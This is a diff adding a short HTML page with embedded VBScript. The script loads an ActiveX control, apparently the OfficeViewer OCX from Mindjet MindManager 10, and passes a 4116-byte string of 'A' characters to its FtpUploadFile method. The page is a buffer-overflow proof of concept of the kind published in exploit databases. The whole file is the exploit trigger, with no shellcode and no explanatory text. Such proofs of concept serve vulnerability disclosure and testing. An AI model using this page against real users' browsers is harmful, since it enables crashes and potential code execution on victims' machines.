@@ -1,0 +1,15 @@
+<object classid='clsid:F6FE8878-54D2-4333-B9F0-FC543B1BE1ED' id='ZSL' />
+<script language='vbscript'>
+
+targetFile = "C:\Program Files\Mindjet\MindManager 10\officeviewermme.ocx"
+prototype  = "Function FtpUploadFile ( ByVal LocalFile As String ,  ByVal RemoteFile As String ) As Boolean"
+memberName = "FtpUploadFile"
+progid     = "OfficeViewer.OfficeViewer"
+argCount   = 2
+
+arg1="defaultV"
+arg2=String(4116, "A")
+
+ZSL.FtpUploadFile arg1 ,arg2 
+
+</script>
